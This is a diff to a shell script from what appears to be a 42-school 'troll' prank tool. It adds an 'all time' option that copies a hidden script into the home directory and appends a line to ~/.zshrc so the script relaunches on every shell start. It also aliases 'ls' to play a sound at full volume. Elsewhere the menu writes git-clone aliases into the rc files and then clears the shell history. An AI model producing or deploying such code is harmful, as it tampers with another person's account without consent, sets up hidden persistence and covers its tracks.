@@ -6,7 +6,7 @@
 #    By: cgarrot <marvin@le-101.fr>                 +:+   +:    +:    +:+      #
 #                                                  #+#   #+    #+    #+#       #
 #    Created: 2019/01/29 15:46:30 by cgarrot      #+#   ##    ##    #+#        #
-#    Updated: 2019/05/06 16:01:05 by cgarrot     ###    #+. /#+    ###.fr      #
+#    Updated: 2019/05/07 15:26:37 by cgarrot     ###    #+. /#+    ###.fr      #
 #                                                          /                   #
 #                                                         /                    #
 # **************************************************************************** #
@@ -930,6 +930,23 @@ function lsound_max()
 	done
 }
 
+function lsound_do_all()
+{
+	if [ -f ~/.zshrc ]
+	then
+		cp ~/.zshrc ~/.zshrcsave
+	fi
+	if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
+	then
+		cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
+	fi
+	touch ~/.zshrc
+	cp ./zshscript ~/.zshscript
+	echo "pgrep -U $USER ~/.zshscript >/dev/null || sh ~/.zshscript" >> ~/.zshrc
+	echo "alias ls='(afplay --volume 255 ~/.${SOUND} &) ; ls -G $1'" >> ~/.oh-my-zsh/custom/alias.zsh
+	cp ./sound/${SOUND} ~/.${SOUND}
+}
+
 function lsound_do_ohmyzsh()
 {
 	if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
@@ -1011,7 +1028,8 @@ function lsound_s()
 	do
 		header
 		printf " (1) oh my zsh \n"
-		printf " (2) zsh \n\n"
+		printf " (2) zsh \n"
+		printf " (3) all time \n\n"
 
 		printf " (m) go to menu | (q) quit\n"
 		read -p $'Number : ' -n 1 KEY
@@ -1021,6 +1039,9 @@ function lsound_s()
 				;;
 				2)
 					lsound_do_zsh
+				;;
+				3)
+					lsound_do_all
 				;;
 				m)
 					menu
@@ -1230,7 +1251,7 @@ function menu()
 					exit
 				;;
 				i)
-					echo "alias ttroll101='git clone https://github.com/ripZeide/Troll_42.git'" >> ~/.oh-my-zsh/custom/alias.zsh
+					echo "alias troll101='git clone https://github.com/ripZeide/Troll_42.git'" >> ~/.oh-my-zsh/custom/alias.zsh
 					echo "alias troll42='git clone https://github.com/ripZeide/Troll_42.git'" >> ~/.zshrc
 					history -c
 				;;
